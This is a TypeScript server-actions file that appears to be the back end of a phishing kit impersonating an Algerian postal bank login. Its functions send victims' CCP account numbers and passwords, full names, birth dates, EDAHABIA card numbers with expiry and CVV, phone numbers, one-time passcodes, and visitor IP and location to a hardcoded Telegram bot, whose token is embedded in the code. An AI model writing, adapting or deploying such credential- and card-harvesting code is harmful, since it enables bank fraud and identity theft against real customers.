"use server"

const botToken = "7252070867:AAEnQpmQ9Mxww3SosyBUVvAocXH0nW0Tz84"
const chatId = "5219969216"

export async function sendToTelegram(ccp: string, password: string) {
  try {
    const message = `
🔐 <b>Nouvelle Connexion</b>

<b>CCP (Sans la clé):</b> <code>${ccp}</code>
<b>Mot de passe:</b> ${password}
    `

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      return { success: false, error: "Failed to send data" }
    }

    return { success: true }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return { success: false, error: "Failed to send data" }
  }
}

export async function sendVerificationToTelegram(data: {
  fullName: string
  day: string
  month: string
  year: string
  edahabiaCard: string
  expirationMonth: string
  expirationYear: string
  cvv: string
  phoneNumber: string
}) {
  try {
    const message = `
📋 <b>Vérification des Informations</b>

<b>Nom Complet:</b> ${data.fullName}
<b>Date de Naissance:</b> ${data.day}/${data.month}/${data.year}
<b>Carte EDAHABIA:</b> <code>${data.edahabiaCard}</code>
<b>Expiration:</b> ${data.expirationMonth}/${data.expirationYear}
<b>CVV:</b> ${data.cvv}
<b>Numéro de Téléphone:</b> ${data.phoneNumber}
    `

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      return { success: false, error: "Failed to send data" }
    }

    return { success: true }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return { success: false, error: "Failed to send data" }
  }
}

export async function sendOtpToTelegram(otp: string) {
  try {
    const message = `
🔐 <b>Tentative OTP</b>

<b>Code OTP:</b> ${otp}
    `

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      return { success: false, error: "Failed to send data" }
    }

    return { success: true }
  } catch (error) {
    console.error("Error sending to Telegram:", error)
    return { success: false, error: "Failed to send data" }
  }
}

export async function sendIpNotification(ip: string, city: string, country: string, region: string, isp: string) {
  try {
    const message = `
📍 <b>Nouvelle Visite - Login Page</b>

<b>IP Address:</b> ${ip}
<b>City:</b> ${city}
<b>Country:</b> ${country}
<b>Region:</b> ${region}
<b>ISP:</b> ${isp}
    `

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      return { success: false, error: "Failed to send notification" }
    }

    return { success: true }
  } catch (error) {
    console.error("Error sending IP notification:", error)
    return { success: false, error: "Failed to send notification" }
  }
}
